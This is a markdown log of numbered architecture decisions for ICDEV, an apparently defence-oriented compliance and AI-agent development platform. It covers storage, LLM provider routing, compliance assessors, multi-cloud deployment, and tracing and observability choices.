# ICDEV™ Architecture Decision Records

All architecture decisions for the ICDEV™ platform. Numbered D1-D360+ and prefixed D-XXX-N.

---

## 1. Core Platform (D1-D100)

- **D1:** SQLite for ICDEV™ internals (zero-config portability); PostgreSQL for apps ICDEV™ builds
- **D2:** Stdio for MCP (Claude Code); HTTPS+mTLS for A2A (K8s inter-agent)
- **D3:** Flask over FastAPI (simpler, fewer deps, auditable SSR, smaller STIG surface)
- **D4:** Statistical methods for pattern detection; Bedrock LLM for root cause analysis
- **D5:** CUI markings applied at generation time (inline, not post-processing)
- **D6:** Audit trail is append-only/immutable (no UPDATE/DELETE — NIST AU compliance)
- **D7:** Python stdlib `xml.etree.ElementTree` for XMI/ReqIF parsing (zero deps, air-gap safe)
- **D8:** Normalized DB tables for model elements (enables SQL joins across digital thread)
- **D9:** M-ANVIL adds "Model" pre-phase to ANVIL (backward compatible — skips if no model)
- **D10:** File-based sync only for Cameo (air-gapped desktop, no API — XMI export/import)
- **D11:** PI-snapshot versioning with SHA-256 content hashing for drift detection
- **D12:** N:M digital thread links (one block → many code modules; one control → many requirements)
- **D13:** Python `ast` module for Python analysis; regex-based parsing for Java/C# (air-gap safe, zero deps)
- **D14:** 7R scoring uses weighted multi-criteria decision matrix with configurable weights
- **D15:** Strangler fig tracking uses digital thread to maintain dual-system traceability (`replaces` link type)
- **D16:** Database migration generates DDL scripts, not runtime tools (reviewed by DBA, air-gap safe)
- **D17:** Framework migration patterns are declarative JSON (add new mappings without code changes)
- **D18:** Legacy analysis is read-only — never modifies source code in place (output to separate dir)
- **D19:** ATO-aware decomposition inherits control mappings from monolith via crosswalk engine
- **D20:** Agent chat stores conversation turns in SQLite, not WebSocket (air-gap compatible, auditable, save/resume)
- **D21:** Readiness scoring uses deterministic weighted average (reproducible, not probabilistic)
- **D22:** Monte Carlo uses Python stdlib `random` (zero deps, air-gap safe)
- **D23:** COA generation uses Bedrock with structured JSON output (mission intent extraction needs LLM)
- **D24:** Jira/ServiceNow/GitLab integration uses REST API with field mapping in DB (change mapping without code changes)
- **D25:** ReqIF export reuses `xml.etree.ElementTree` (consistent with D7)
- **D26:** Boundary impact rules stored as declarative JSON (add rules without code changes, D17 pattern)
- **D27:** Supply chain graph stored as SQL adjacency list (enables recursive queries, no graph DB needed)
- **D28:** Simulation chart data stored as JSON for inline rendering (works in agent chat and dashboard)
- **D29:** SSE over WebSocket for dashboard live updates (Flask-native, simpler, no additional deps, unidirectional sufficient)
- **D30:** Bedrock for NLQ→SQL (not OpenAI) — air-gap safe, consistent with D23, GovCloud available
- **D31:** HMAC-SHA256 event signing for hooks (tamper detection without PKI overhead, secret via AWS Secrets Manager)
- **D32:** Git worktrees with sparse checkout for task isolation (zero-conflict parallelism, per-task branches, classification markers)
- **D33:** GitLab tags `{{icdev: workflow}}` for task routing (mirrors Phase 41 Notion pattern, uses existing VCS abstraction)
- **D34:** Read-only SQL enforcement for NLQ (append-only audit trail must not be compromised by NLQ queries)
- **D35:** Agent executor stores JSONL output in `agents/` dir (auditable, replayable, consistent with Phase 39 observability pattern)
- **D36:** `boto3 invoke_model()` + `invoke_model_with_response_stream()` for Bedrock, `ThreadPoolExecutor` for parallelism — matches existing subprocess/sqlite3 patterns, no asyncio
- **D37:** Model fallback chain: Opus 4.6 → Sonnet 4.5 → Sonnet 3.5 with cached health probing (30min TTL)
- **D38:** Effort parameter mapped per agent role (Orchestrator=high, Builder=max, Monitor=low) — optimize cost/quality per agent
- **D39:** Structured outputs via `output_config.format` with JSON Schema per agent response type — enforce agent response contracts
- **D40:** `graphlib.TopologicalSorter` (stdlib Python 3.9+) for task DAG — air-gap safe, zero deps, cycle detection built-in
- **D41:** SQLite-based agent mailbox with HMAC-SHA256 signing — air-gap safe, append-only for audit, tamper-evident
- **D42:** Domain authority defined in YAML matrix, vetoes recorded append-only — configurable without code changes, auditable
- **D43:** Agent memory scoped by `(agent_id, project_id)` with team-shared via `agent_id='_team'` — prevents cross-project contamination
- **D44:** Flag-based (`--agentic`) for backward compatibility — omitting flag produces identical output
- **D45:** Copy-and-adapt over template library — ICDEV™ tools are the source of truth
- **D46:** Fitness scoring: weighted rule-based + optional LLM override
- **D47:** Blueprint-driven generation — single config drives all generators
- **D48:** ICDEV™ callback uses A2A protocol for child→parent communication
- **D49:** Agentic tests as Step 8 (conditional) in test pipeline
- **D50:** Dynamic CLAUDE.md via Jinja2 — documents only what's present
- **D51:** Minimal DB + migration — core tables first, expand as capabilities activate
- **D52:** 3-layer grandchild prevention (config flag + scaffolder strip + CLAUDE.md doc)
- **D53:** Port offset for child agents (default +1000, configurable)
- **D54:** FIPS 199 uses high watermark across SP 800-60 information types; provisionals are defaults, adjustable per org
- **D55:** FIPS 200 validates all 17 minimum security areas against baseline from FIPS 199, not impact level alone
- **D56:** SSP baseline selection is dynamic: query DB for categorization first, fall back to IL mapping
- **D57:** CNSSI 1253 auto-applies for IL6/SECRET; elevates minimum C/I/A floor per overlay rules
- **D58:** SaaS layer wraps existing tools, doesn't rewrite — preserves 20 phases of work; API gateway is additive
- **D59:** PostgreSQL for all SaaS databases — concurrent writes, MVCC, RLS capability, RDS managed (SQLite fallback for dev)
- **D60:** Separate database per tenant — strongest isolation, simplest compliance, easy backup/restore per tenant
- **D61:** API gateway as thin routing layer — auth + tenant resolution + routing; tools stay deterministic
- **D62:** MCP Streamable HTTP transport alongside REST — supports Claude Code users (MCP) and generic HTTP clients (REST)
- **D63:** Per-tenant K8s namespace (IL2-4), per-tenant AWS sub-account (IL5-6) — isolation scales with classification
- **D64:** Offline license keys with RSA-SHA256 signatures — air-gap safe, no license server needed for on-prem
- **D65:** Helm chart for on-prem deployment — standard K8s packaging, customer's own infrastructure
- **D66:** Provider abstraction pattern (ABC + implementations) — interface + adapters; vendor logic isolated per provider
- **D67:** OpenAI-compatible provider covers Ollama, vLLM, Azure — all use same API spec, one implementation with configurable base_url
- **D68:** Function-level LLM routing (not agent-level) — NLQ needs fast/cheap, code gen needs strong coder; function granularity gives best-of-breed control
- **D69:** Fallback chains per function — air-gapped deploys set `prefer_local: true`, chains end with local models; cloud deploys use cloud-first chains
- **D70:** BedrockClient preserved for Bedrock-specific callers; tools.llm provides vendor-agnostic alternative
- **D71:** llm_config.yaml is single source of truth for all LLM model routing — replaces scattered hardcoded model IDs
- **D72:** Embedding providers same pattern as LLM providers — Ollama nomic-embed-text for air-gapped, OpenAI for cloud, Bedrock Titan as middle option
- **D73:** Graceful degradation on missing SDKs — each provider handles missing `anthropic`, `openai`, or `boto3` imports
- **D74:** Marketplace is a SaaS module (reuse Phase 21 auth, RBAC, tenant isolation, API gateway)
- **D75:** Federated 3-tier catalog: tenant-local → cross-tenant review → central vetted registry
- **D76:** 7-gate automated + mandatory human review for cross-tenant sharing
- **D77:** Independent IL marking per asset with high-watermark consumption rule
- **D78:** Ollama nomic-embed-text for air-gapped marketplace semantic search (D72 pattern)
- **D79:** Full FORGE asset sharing: skills, goals, hardprompts, context, args, compliance extensions
- **D80:** Append-only marketplace audit trail (publish, install, review, rate) per D6 pattern
- **D81:** Asset SBOM generation required for executable assets (supply chain traceability)
- **D82:** Ollama LLaVA for air-gapped vision; vision is a message format concern (multimodal content blocks), not a provider architecture concern — all 3 providers (Bedrock, Anthropic, OpenAI-compat) support it via existing infrastructure
- **D83:** Page-by-page PDF vision fallback — pypdf text extraction first, vision LLM only for pages with no extractable text (scanned PDFs)
- **D84:** Image auto-classification via vision LLM at upload time — stored in `extracted_sections` column as JSON `{category, confidence, description}`
- **D85:** UI complexity as optional 7R scoring dimension — D44 backward-compatible flag pattern; skipped when no UI analysis exists
- **D86:** Vision diagram extraction is advisory-only — requires `--store` flag to write elements to DB (human review gate before model contamination)
- **D87:** Attachment analysis reuses `screenshot_validator.encode_image()` for single image encoding path across all vision tools
- **D88:** UX Translation Layer wraps existing tools without rewriting them — Jinja2 filters + JS modules convert technical output to business-friendly display
- **D89:** Glossary tooltip system uses `data-glossary` HTML attributes + client-side JS — no backend changes needed to add new terms
- **D90:** Role-based views via `?role=` query parameter + Flask context processor — no authentication required, progressive disclosure by persona
- **D91:** Getting Started wizard uses declarative path mapping (goal × role × classification → recommended workflow) — add new paths without code changes
- **D92:** Error recovery dictionary maps gate failure codes to plain-English fix instructions with who/what/why/fix/estimated-time — non-technical users can self-serve
- **D93:** Quick Path templates are declarative data (list of dicts in ux_helpers.py) — add new workflow shortcuts without touching templates
- **D94:** SVG chart library (charts.js) is zero-dependency, renders server data into lightweight SVG — no Chart.js/D3 needed, air-gap safe, WCAG accessible (role="img", aria-label)
- **D95:** Table interactivity (tables.js) auto-enhances all `.table-container` tables on page load — search, sort, filter, CSV export with no per-table configuration
- **D96:** CLI output formatter uses only Python stdlib (ANSI codes, os.get_terminal_size) — `--human` flag on any tool for colored tables/banners/scores instead of JSON
- **D97:** SaaS portal UX mirrors main dashboard patterns (glossary, breadcrumbs, skip-link, ARIA) via portal-specific CSS/JS — no shared dependency to avoid coupling
- **D98:** Onboarding tour uses localStorage (`icdev_tour_completed`) for first-visit detection — no server-side user tracking, air-gap safe
- **D99:** SSE live updates debounce to 3-second batches — prevents API hammering while keeping dashboard near-real-time
- **D100:** Batch operations run as sequential subprocesses in background threads — Flask request returns immediately, frontend polls status

---

## 2. Compliance & Security (D101-D178)

- **D101:** Keyboard shortcuts use chord pattern (`g` + key) to avoid conflicts with browser shortcuts — 1.5s chord window, cancelled on invalid key
- **D102:** All Medium Impact UX modules inject styles via JS (no additional CSS files) — consistent with ux.js pattern, self-contained modules
- **D109:** Composable data markings — single artifact can carry CUI + PHI + PCI markings simultaneously; highest-sensitivity category determines handling
- **D110:** Compliance auto-detection is advisory only — system recommends frameworks based on data types; customer ISSO must confirm before gates enforce
- **D111:** Dual-hub crosswalk model — NIST 800-53 as US hub, ISO 27001 as international hub, bidirectional bridge connects both; implement once at either hub, cascade everywhere
- **D112:** Framework catalogs are versioned independently — each JSON catalog has its own version; update one framework without touching others
- **D113:** Multi-regime deduplication via crosswalk — assessing N frameworks produces 1 unified NIST control set, not N separate assessments
- **D114:** Compliance framework as marketplace asset type — community-contributed framework catalogs can be published, scanned, and installed via Phase 22 marketplace
- **D115:** Data type → framework mapping is declarative JSON — add new detection rules without code changes; `data_type_framework_map.json` drives all auto-detection
- **D116:** BaseAssessor ABC pattern (mirrors D66 provider pattern) — all assessors inherit from base class with crosswalk integration, gate evaluation, and CLI; ~60 LOC per new framework vs ~400+ LOC
- **D117:** New DevSecOps/ZTA Agent (port 8457) with hard veto on pipeline_configuration, zero_trust_policy, deployment_gate — hybrid approach distributes scanning to Security Agent, IaC to Infra Agent, compliance to Compliance Agent
- **D118:** NIST 800-207 maps into existing NIST 800-53 US hub (not a third hub) — ZTA is an architecture guide; requirements crosswalk to AC-2, AC-3, SA-3, SC-7, SI-4, AU-2, etc.
- **D119:** DevSecOps profile is a per-project YAML config (`devsecops_profiles` table) declaring active pipeline security stages — detected during intake, overridable post-intake
- **D120:** ZTA maturity model uses DoD 7-pillar scoring (Traditional → Advanced → Optimal) tracked per project per pillar
- **D121:** Service mesh and policy engine are profile-selectable (Istio/Linkerd, Kyverno/OPA) — both generated, customer picks in profile
- **D122:** DevSecOps/ZTA profile inherited by child apps generated via `/icdev-agentic` (extends D44 flag pattern)
- **D123:** ZTA posture score feeds into cATO monitor as additional evidence dimension (extends `cato_evidence` table)
- **D124:** PDP modeled as external reference in ZTA profile (Zscaler, Palo Alto, DISA ICAM) — ICDEV™ generates PEP configs but does not implement PDP itself
- **D125:** MOSA auto-triggers for all DoD/IC customers during intake (not just MDAPs) — IL4+ also triggers MOSA consideration
- **D126:** MOSA focuses on software development principles only (no FACE/VICTORY/SOSA/HOST domain-specific profiles)
- **D127:** MOSA implemented as full compliance framework via BaseAssessor pattern (D116) with gate, crosswalk, multi-regime
- **D128:** ICD/TSP are generated compliance artifacts (mirrors SSP/POAM pattern), stored in DB with CUI markings
- **D129:** MOSA code enforcement uses static analysis (coupling/cohesion/interface coverage) — deterministic, air-gap safe
- **D130:** MOSA cATO evidence is optional (config flag `cato_integration.enabled: true` in mosa_config.yaml)
- **D131:** Modularity metrics stored as time-series in `mosa_modularity_metrics` table for trend tracking
- **D132:** CLI capabilities are optional per-project toggles with tenant-level ceiling. Tenant sets maximum allowed capabilities; project enables within ceiling. Default is all-disabled — VSCode extension provides full functionality. CLI adds headless/scripted/parallel/containerized execution modes for environments that support them. Cost controls enforce token budgets. Detection auto-checks CLI availability and falls back gracefully.
- **D133:** Channel adapters are ABC + implementations (D66 pattern) — add new channels without modifying gateway core
- **D134:** Air-gapped environments use internal chat + optional Mattermost, never internet channels — IL6/SIPR cannot reach Telegram/Slack/Teams APIs
- **D135:** Response filter strips content above channel max_il, never upgrades — prevents CUI/SECRET leaking to unauthorized channels
- **D136:** User binding is mandatory before any command execution — no anonymous remote commands, full identity chain
- **D137:** Command allowlist is YAML-driven with per-channel overrides — add/remove commands without code changes (D26 pattern)
- **D138:** Deploy commands disabled by default on all remote channels — destructive operations require dashboard/CLI access
- **D139:** `environment.mode: air_gapped` auto-disables internet-dependent channels — single config toggle, no per-channel manual disable needed
- **D140:** Mattermost adapter uses REST API (no WebSocket) — consistent with D20 (no WebSocket), simpler, works behind proxies
- **D141:** HPA with CPU/memory metrics as baseline; custom metrics (queue depth, Bedrock token rate) via Prometheus adapter as Phase 2. All HPA manifests use `autoscaling/v2` API. Cloud-agnostic — works on EKS, GKE, AKS, OpenShift, bare-metal K8s
- **D142:** Cluster Autoscaler as cloud-agnostic baseline for node auto-scaling; vendor-specific optimizations (Karpenter for EKS, GKE Autopilot, AKS cluster-autoscaler) as optional overlays
- **D143:** PDB with `minAvailable=1` for core agents + dashboard + gateway; `maxUnavailable=1` for domain + support agents
- **D144:** Cross-AZ topology spread with `whenUnsatisfiable: ScheduleAnyway` (availability over strict spread) for all scaled components
- **D145:** Platform compatibility module (`tools/compat/`) centralizes OS detection — single source of truth for platform-specific behavior; stdlib only, air-gap safe
- **D146:** Application-level circuit breaker using ABC + in-memory state (stdlib only); 3-state machine: CLOSED → OPEN → HALF_OPEN. D66 provider pattern for pluggable backends
- **D147:** Reusable retry utility extracted from bedrock_client.py; exponential backoff + full jitter; decorator pattern with configurable exceptions and on_retry callback
- **D148:** Structured error hierarchy for new code only (ICDevError → Transient/Permanent → ServiceUnavailable/RateLimited/Configuration); existing 450 bare exceptions left untouched to avoid mass-refactor risk
- **D149:** Request-scoped correlation ID via Flask before_request middleware; propagated through A2A JSON-RPC metadata and audit trail session_id; 12-char UUID prefix
- **D150:** Lightweight migration runner (stdlib only, no Alembic); `schema_migrations` table for version tracking; .sql/.py files with `@sqlite-only`/`@pg-only` directives; checksum validation
- **D151:** Baseline migration (v001) delegates to init_icdev_db.py rather than duplicating 2860-line SQL; init_icdev_db.py preserved for backward compat, detects migration system
- **D152:** Backup tool uses `sqlite3.backup()` API for SQLite (WAL-safe online backup), `pg_dump` for PostgreSQL; optional AES-256-CBC encryption via `cryptography` package (PBKDF2, 600K iterations)
- **D153:** OpenAPI 3.0.3 spec generated programmatically from declarative schema dicts; no flask-restx dependency; Swagger UI loaded from CDN (bundleable for air-gap); 23 endpoints documented
- **D154:** Prometheus metrics use optional `prometheus_client` with stdlib text-format fallback (D66 dual-backend pattern); /metrics exempt from auth; 8 metrics covering HTTP, errors, rate limits, circuit breakers, uptime, tenants
- **D155:** Project-root conftest.py with shared fixtures (icdev_db, platform_db, api_gateway_app, dashboard_app, auth_headers) centralizes test DB setup; test strategy prioritizes security-critical paths first
- **D156:** Spec quality checklist is declarative JSON — add/remove checks without code changes (consistent with D26 pattern)
- **D157:** Cross-artifact consistency uses markdown section-header parsing (`## Header`) — simple, reliable, stdlib-only, air-gap safe
- **D158:** Constitutions stored in DB per-project with defaults from JSON — allows per-project customization while maintaining DoD defaults
- **D159:** Clarification prioritization uses deterministic Impact × Uncertainty 2D matrix — consistent with D21 readiness scoring approach
- **D160:** Per-feature spec directories are optional (additive) — existing flat spec files continue to work unchanged
- **D161:** Parallel markers use `parallel_group` field in safe_decomposition — reuses existing DAG infrastructure (D40) for concurrency annotation
- **D162:** Heartbeat daemon uses configurable check registry with per-check intervals in YAML — each check type has its own cadence (D26 pattern)
- **D163:** Heartbeat notifications fan out to 3 sinks: audit trail (always), SSE (if dashboard running), gateway channels (if configured)
- **D164:** Auto-resolver extends existing webhook_server.py with `/alert-webhook` endpoint — avoids second Flask app, reuses HMAC verification
- **D165:** Auto-resolver reuses existing 3-tier self-healing decision engine (≥0.7 auto, 0.3–0.7 suggest, <0.3 escalate) and rate limits (5/hour)
- **D166:** Auto-resolver creates fix branches/PRs via existing VCS abstraction (`tools/ci/modules/vcs.py`)
- **D167:** Selective skill injection via deterministic keyword-based category matching — no LLM required, declarative YAML config (D26 pattern)
- **D168:** Time-decay uses exponential formula `2^(-(age/half_life))` with per-memory-type half-lives, opt-in via `--time-decay` flag (backward compatible)
- **D169:** Dashboard auth is self-contained against `icdev.db` (not imported from SaaS layer) — keeps dashboard independently deployable
- **D170:** WebSocket via Flask-SocketIO is additive — HTTP polling (D103) remains for backward compat. Falls back automatically when SocketIO unavailable
- **D171:** Session cookies use Flask's built-in signed sessions. `app.secret_key` from `ICDEV_DASHBOARD_SECRET` env var or auto-generated
- **D172:** Dashboard RBAC: 5 roles (admin, pm, developer, isso, co). Admin manages users/keys. Others map to existing `ROLE_VIEWS` for page visibility
- **D173:** CUI banner toggle via `ICDEV_CUI_BANNER_ENABLED` env var (default `true`). Existing `CUI_BANNER_TOP/BOTTOM` env vars preserved
- **D174:** Activity feed merges `audit_trail` + `hook_events` via UNION ALL query — read-only, preserves append-only contract (D6)
- **D175:** BYOK keys stored AES-256 encrypted in `dashboard_user_llm_keys` table (Fernet symmetric encryption, key from env var). Per-user keys override per-department env vars, which override system config
- **D176:** BYOK injection via `api_key_override` field on `LLMRequest` — router passes override to provider, provider uses it before config/env fallback
- **D177:** Usage tracking extends `agent_token_usage` table with `user_id` column (nullable for backward compat). Cost dashboard aggregates by user and provider
- **D178:** BYOK disabled by default (`ICDEV_BYOK_ENABLED=false`). When enabled, users see an "LLM Keys" section in their profile. Admin can enable/disable per-tenant

---

## 3. Infrastructure & Cloud (D183-D256)

- **D183:** Version-based immutability — no UPDATE on `dev_profiles`, insert new version (consistent with D6 append-only)
- **D184:** 5-layer deterministic cascade (Platform → Tenant → Program → Project → User) — locked dimensions skip-propagate (child cannot override locked parent)
- **D185:** Auto-detection is advisory only — detected profile dimensions require human acceptance (consistent with D110 compliance auto-detection)
- **D186:** PROFILE.md generated from dev_profile via Jinja2 (consistent with D50 dynamic CLAUDE.md) — read-only narrative, not separately editable
- **D187:** LLM injection uses selective dimension extraction per task context (consistent with D167 skill injection) — code gen gets language+style, review gets testing+security
- **D188:** Starter templates in `context/profiles/*.yaml` (consistent with `context/requirements/default_constitutions.json`) — 6 sector-specific templates (DoD, FedRAMP, Healthcare, Financial, Law Enforcement, Startup)
- **D189:** `icdev.yaml` is advisory — declares intent but DB remains source of truth; explicit `--init` required to sync manifest to DB
- **D190:** Session context outputs as stdout markdown (like `memory_read.py`) — not dynamic CLAUDE.md injection; consumed by Claude at session start
- **D191:** SDK wraps CLI subprocess calls (not REST API) — works offline, air-gap safe (D134), no server dependency; `stdin=DEVNULL`, timeout, safe env filtering
- **D192:** Pipeline config generator uses declarative CHECK_REGISTRY (D26 pattern) — add new checks without code changes; generates GitHub Actions or GitLab CI from `icdev.yaml`
- **D193:** Env var overrides use `ICDEV_` prefix; 3-level precedence: env > yaml > defaults; integer auto-parsing for gate thresholds
- **D194:** Companion registry (`args/companion_registry.yaml`) is declarative YAML — add new AI tools without code changes (D26 pattern); 10 tools: Claude Code, Codex, Gemini, Copilot, Cursor, Windsurf, Amazon Q, JetBrains/Junie, Cline, Aider
- **D195:** Instruction files generated from Jinja2 string constant templates (D186 pattern) — one template per tool format, each tailored to the tool's conventions
- **D196:** MCP is the primary integration protocol — 9/10 supported tools have MCP support; `.mcp.json` (Claude Code format) is source of truth, translated to per-tool config formats
- **D197:** Tool detection is advisory only (D110/D185 pattern) — auto-detect from env vars, config dirs, config files; explicit `--platform` override always available
- **D198:** Skill translation preserves semantic intent — each tool gets equivalent capability in its native format, not a literal copy
- **D199:** Scan frequency configurable per source in `args/innovation_config.yaml`
- **D200:** Human-in-the-loop: score >= 0.80 auto-queues, 0.50-0.79 suggests, < 0.50 logs only
- **D201:** Budget: max 10 auto-generated solutions per PI
- **D202:** IP/license scanning blocks GPL/AGPL/SSPL (copyleft risk for Gov/DoD)
- **D203:** Introspective analysis is air-gap safe (reads internal DB only)
- **D204:** Standards monitoring degrades gracefully when offline
- **D205:** Competitive intel for GitHub-based competitors (website scraping requires additional setup)
- **D206:** All signals append-only (D6 pattern), triage decisions audited
- **D207:** Trend detection uses deterministic keyword co-occurrence (no LLM, air-gap safe)
- **D208:** Solution specs are template-based (not LLM-generated)
- **D209:** Capability genome uses semver + SHA-256 content hash for versioned, tamper-evident genome tracking (Phase 36)
- **D210:** Telemetry collector uses pull-based model — parent polls child heartbeat endpoints (no child→parent push required)
- **D211:** Staging manager uses git worktree isolation for capability testing before genome absorption
- **D212:** 72-hour stability window before genome absorption — capability must demonstrate stability in staging for ≥72 hours
- **D213:** Bidirectional learning: children report learned behaviors to parent via LearningCollector; parent evaluates and optionally absorbs into genome
- **D214:** Cross-pollination requires HITL approval — no auto-execute for capability sharing between children (append-only propagation_log)
- **D215:** Prompt injection detector uses 5 detection categories: role hijacking, delimiter attacks, instruction injection, data exfiltration, encoded payloads
- **D216:** AI telemetry logger hashes prompts/responses with SHA-256 — stores hashes not plaintext (privacy-preserving audit)
- **D217:** AI BOM (AI Bill of Materials) tracks all AI/ML components, models, training data lineage
- **D218:** ATLAS assessor maps MITRE ATLAS mitigations to automated checks via BaseAssessor pattern (D116)
- **D219:** ATLAS red teaming is opt-in only (`--atlas-red-team` flag) — never auto-executes adversarial tests
- **D220:** OWASP LLM Top 10 assessor crosswalks through ATLAS to NIST 800-53 US hub
- **D221:** NIST AI RMF assessor covers 4 functions (Govern, Map, Measure, Manage) with 12 subcategories
- **D222:** ISO 42001 assessor bridges through ISO 27001 international hub for crosswalk integration
- **D223:** SAFE-AI catalog maps 100 AI-affected NIST 800-53 controls with `ai_concern` narrative per control
- **D224:** Capability evaluator uses 6-dimension weighted scoring: universality(0.25), compliance_safety(0.25), risk(0.20), evidence(0.15), novelty(0.10), cost(0.05)
- **D225:** CSP abstraction uses ABC + 6 implementations (AWS, Azure, GCP, OCI, IBM, Local) per service — Secrets, Storage, KMS, Monitoring, IAM, Registry
- **D226:** Multi-cloud Terraform generators produce CSP-specific IaC (Azure Gov VNet/AKS, GCP Assured Workloads VPC/GKE, OCI Gov VCN/OKE, IBM IC4G VPC/IKS, on-prem K8s/Docker)
- **D227:** Terraform dispatcher auto-detects CSP from `cloud_config.yaml` or `ICDEV_CLOUD_PROVIDER` env var, delegates to CSP-specific generator
- **D228:** LLM multi-cloud: Azure OpenAI (*.openai.azure.us), Vertex AI (Gemini + Claude-via-Vertex), OCI GenAI (Cohere + Llama), IBM watsonx.ai (Granite + Llama) — all via LLMProvider ABC
- **D229:** Helm value overlays per CSP (`values-aws.yaml`, `values-azure.yaml`, `values-gcp.yaml`, `values-oci.yaml`, `values-ibm.yaml`, `values-on-prem.yaml`, `values-docker.yaml`) for CSP-specific K8s config
- **D230:** CSP health checker probes all configured cloud services and stores status in `cloud_provider_status` table
- **D231:** Marketplace Gates 8-9: prompt injection scan (blocking) + behavioral sandbox (warning) — scans all asset files for injection patterns and dangerous code patterns
- **D232:** `cloud_mode` (commercial/government/on_prem/air_gapped) controls endpoint selection and feature availability per CSP — single config field, providers adapt behavior
- **D233:** CSP region certifications stored as declarative JSON (`csp_certifications.json`); human-maintained, machine-validated at deployment time
- **D234:** Region validator blocks deployment to regions lacking required compliance certifications before Terraform/Helm generation (REQ-38-080-082)
- **D236:** On-prem Terraform targets Docker Compose and self-managed K8s; no cloud provider block required
- **D237:** IBM Cloud providers follow D66 ABC pattern with `ibm-cloud-sdk-core` + `ibm-platform-services` SDKs; IBM COS uses S3-compatible `ibm_boto3`
- **D238:** IBM watsonx.ai LLM provider uses `ibm-watsonx-ai` SDK; Granite and Llama model families; embedding via Slate model
- **D239:** CSP monitoring integrated as Innovation Engine source (Phase 35) — reuses existing signal scoring, triage, and solution generation pipeline; CSP changes treated as innovation signals with category mapping and government/compliance boosts
- **D240:** Declarative CSP service registry as JSON catalog (extends D26 pattern) — baseline of all CSP services, compliance programs, regions, and FIPS status; monitor diffs live data against registry to detect changes; human review required before registry updates
- **D241:** CSP changelog generates actionable recommendations per change type — each change type (deprecation, compliance scope change, breaking API change, etc.) maps to specific files and actions
- **D242:** Hybrid 5-phase translation pipeline — deterministic extraction + type-checking + LLM translation + deterministic assembly + validate-repair loop. Consistent with FORGE principle (LLMs probabilistic, business logic deterministic)
- **D243:** IR pivot — source code extracted into language-agnostic JSON IR before translation. Enables chunk-based translation, round-trip validation, progress tracking per unit
- **D244:** Post-order dependency graph traversal at function/class granularity — translate leaf nodes first, then dependents (Amazon Oxidizer)
- **D245:** Non-destructive output (extends D18) — translation output to separate directory, source never modified
- **D246:** Declarative dependency mapping tables (D26 pattern) — cross-language package equivalents in `context/translation/dependency_mappings.json`
- **D247:** 3-part feature mapping rules (Amazon Oxidizer) — syntactic pattern + NL description + static validation check per language pair
- **D248:** Round-trip IR consistency check — re-parse translated output into IR, compare structurally to source IR
- **D249:** Translation compliance bridge — reuses `compliance_bridge.py` for NIST 800-53 control inheritance (95% threshold)
- **D250:** Test translation as separate tool — `test_translator.py` with framework-specific assertion mapping; BDD `.feature` files preserved
- **D251:** Translation DB tables follow existing `migration_plans`/`migration_tasks` pattern for traceability
- **D252:** Dashboard/Portal translation pages follow existing page patterns (stat-grid, table-container, charts.js)
- **D253:** Type-compatibility pre-check (Amazon Oxidizer) — validate function signatures map correctly between source/target type systems BEFORE LLM translation
- **D254:** Pass@k candidate generation (Google) — generate k translation candidates with varied prompts, select best. Default k=3 cloud, k=1 air-gapped
- **D255:** Compiler-feedback repair loop (Google/CoTran) — on validation failure, feed compiler errors back to LLM for targeted repair (max 3 attempts)
- **D256:** Mock-and-continue (Amazon Oxidizer) — on persistent failure, generate type-compatible mock/stub and continue translating dependent units

---

## 4. Innovation & AI (D257-D360)

- **D257-D260:** Multi-Stream Parallel Chat — thread-per-context execution, contexts scoped to `(user_id, tenant_id)`, max 5 concurrent per user, message queue via `collections.deque`, independent of intake sessions
- **D261-D264:** Active Extension Hooks — extensions loaded from numbered Python files (Agent Zero pattern), two tiers: behavioral (modify data) and observational (log only), layered override (project > tenant > default), exception isolation
- **D265-D267:** Mid-Stream Intervention — atomic intervention field on ChatContext, checked at 3 points per loop iteration (pre-LLM, post-LLM, pre-queue-pop), checkpoint preservation, intervention messages stored as `role='intervention'`
- **D268-D270:** Dirty-Tracking State Push — per-client dirty/pushed version counters, SSE debounced at 25ms, HTTP polling at 3s, clients send `?since_version=N` for incremental updates
- **D271-D274:** 3-Tier History Compression — opt-in per context, budget: current topic 50%, historical 30%, bulk 20%, topic boundary: time gap >30min OR keyword shift >60%, LLM/truncation fallback
- **D275:** Shared Schema Enforcement — stdlib `dataclasses` (air-gap safe), optional Pydantic, backward compatible via `to_dict()`, `validate_output()` with strict/non-strict modes
- **D276:** AI-Driven Memory Consolidation — optional `--consolidate` flag, hybrid search finds similar entries, LLM decides MERGE/REPLACE/KEEP_SEPARATE/UPDATE/SKIP, Jaccard keyword fallback, append-only consolidation log
- **D277:** Semantic Layer MCP Tools — CLAUDE.md section indexing via `##` header parsing, metadata from DB with cache TTL, agent-role→section mapping, air-gap safe (stdlib only)
- **D278:** Dangerous Pattern Detection — unified scanner across 6 languages (Python, Java, Go, Rust, C#, TypeScript), callable from marketplace/translation/child app generation/security scanning, declarative YAML patterns
- **D279:** Innovation Signal Registration — external patterns registered as innovation signals, source type `external_framework_analysis`, 5-dimension weighted scoring (novelty, feasibility, compliance_alignment, user_impact, effort)
- **D280:** Pluggable Tracer ABC: `OTelTracer` (production), `SQLiteTracer` (air-gapped), `NullTracer` (fallback). Haystack ProxyTracer pattern. `opentelemetry-sdk` stays optional
- **D281:** Extend correlation ID (D149) to W3C `traceparent` format — additive, backward compatible
- **D282:** Content tracing opt-in via `ICDEV_CONTENT_TRACING_ENABLED` env var — CUI environments must never leak content to telemetry; SHA-256 hashes always recorded, plaintext only when opted in
- **D283:** MLflow as unified trace backend (Apache 2.0, self-hosted) — DoD-safe license, accepts OTLP natively (3.6+), built-in trace UI, SQLite/PG backend matches D1
- **D284:** MCP auto-instrumentation at `base_server.py._handle_tools_call()` — single change instruments all 15 MCP servers
- **D285:** A2A distributed tracing via traceparent in JSON-RPC metadata — 3-line additions to `agent_client.py` and `agent_server.py`
- **D286:** LLM instrumentation at router level with GenAI semantic conventions — `gen_ai.request.model`, `gen_ai.usage.*`, `gen_ai.response.*`
- **D287:** PROV-AGENT provenance in 3 append-only SQLite tables — W3C PROV standard (DOE-funded), Entity/Activity/Relation model
- **D288:** AgentSHAP post-hoc tool attribution via Monte Carlo Shapley values — 0.945 consistency (arXiv:2512.12597), stdlib `random` for sampling (D22 air-gap safe)
- **D289:** XAI assessor via BaseAssessor pattern (D116) — ~200 LOC, crosswalk to NIST 800-53 US hub cascades to FedRAMP/CMMC
- **D290:** Dual-mode config in `args/observability_tracing_config.yaml` — auto-detect: `ICDEV_MLFLOW_TRACKING_URI` set → `otel` mode, else → `sqlite` mode
